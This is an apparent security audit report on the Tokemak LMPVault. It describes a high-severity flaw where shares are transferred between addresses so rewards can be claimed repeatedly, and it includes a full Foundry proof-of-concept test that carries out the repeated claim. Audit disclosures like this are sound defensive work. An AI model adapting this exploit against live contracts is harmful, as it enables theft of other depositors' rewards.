lil.eth

high

# User can transfer LMPVault shares to claim rewards multiple times
## Summary

Users deposit funds into LMPVault through the router. They get a share of the generated rewards. ERC20 token represents those shares. Anyone can transfer those shares between multiple addresses to claim rewards more times.

## Vulnerability Detail

A user gets tokens for every deposit into LMPVault. Those tokens represent shares on Vault deposits and rewards.
After rewards accumulate, the user can call the collectRewards function to get rewards based on his shares.
No mechanism prohibits the user from sending those share tokens to another address and claiming rewards multiple times.
Malicious user steals other users' rewards with this simple technique.

### POC

Paste this test function to **LMPVault-Withdraw.t.sol**.

It is necessary to update **IBaseRewarder.sol** for the purpose of this demo. Paste ```function setTokeLockDuration(uint256 _tokeLockDuration) external;``` to expose the function.

Run the test using this command ```forge test --match-contract LMPVaultMintingTests --match-test test_stealRewards```.

```solidity
function test_stealRewards() public {
    // Prepare rewards
    _accessController.grantRole(Roles.DV_REWARD_MANAGER_ROLE, address(this));
    _lmpVault.rewarder().addToWhitelist(address(this));
    // setTokeLockDuration not present in IBaseRewarder.sol - function setTokeLockDuration(uint256 _tokeLockDuration) external;
    // Lock duration is set to zero for the demonstration that the user can claim rewards with the same shares transferred to another address
    _lmpVault.rewarder().setTokeLockDuration(0);
    _toke.mint(address(this), 1000e18);
    _toke.approve(address(_lmpVault.rewarder()), 1000e18);
    _lmpVault.rewarder().queueNewRewards(1000e18);

    // Prepare users
    address user1 = makeAddr("1");
    address user2 = makeAddr("2");
    address attacker1 = makeAddr("3");
    address attacker2 = makeAddr("4");
    _asset.mint(user1, 1000);
    _asset.mint(user2, 1000);
    _asset.mint(attacker1, 1000);

    assertEq(_lmpVault.balanceOf(address(this)), 0);
    assertEq(_lmpVault.rewarder().balanceOf(address(this)), 0);

    // Deposit
    vm.startPrank(attacker1);
    _asset.approve(address(_lmpVault), 1000);
    _lmpVault.deposit(1000, attacker1);
    vm.stopPrank();

    vm.startPrank(user1);
    _asset.approve(address(_lmpVault), 1000);
    _lmpVault.deposit(1000, user1);
    vm.stopPrank();

    vm.startPrank(user2);
    _asset.approve(address(_lmpVault), 1000);
    _lmpVault.deposit(1000, user2);
    vm.stopPrank();

    assert(_toke.balanceOf(attacker1) == 0);
    assert(_toke.balanceOf(attacker2) == 0);

    // Warp forward
    vm.roll(block.number + 10_000);

    // Get rewards and transfer shares to the second address
    vm.startPrank(attacker1);
    _lmpVault.rewarder().getReward();
    _lmpVault.transfer(attacker2, 1000);
    vm.stopPrank();

    // Get rewards with seconds address
    vm.startPrank(attacker2);
    _lmpVault.rewarder().getReward();
    vm.stopPrank();
    
    assert(_toke.balanceOf(attacker1) > 0);
    assert(_toke.balanceOf(attacker2) > 0);
}
```

## Impact

Rewards of other users get stolen by one malicious user who transfers share tokens between multiple addresses.

## Code Snippet

[https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/rewarders/MainRewarder.sol#L95C5-L117C6](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/rewarders/MainRewarder.sol#L95C5-L117C6)

[https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/rewarders/AbstractRewarder.sol#L128C4-L140C6](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/rewarders/AbstractRewarder.sol#L128C4-L140C6)

## Tool used

Manual Review

## Recommendation

Prohibit share token transfers between users or track eligibility.
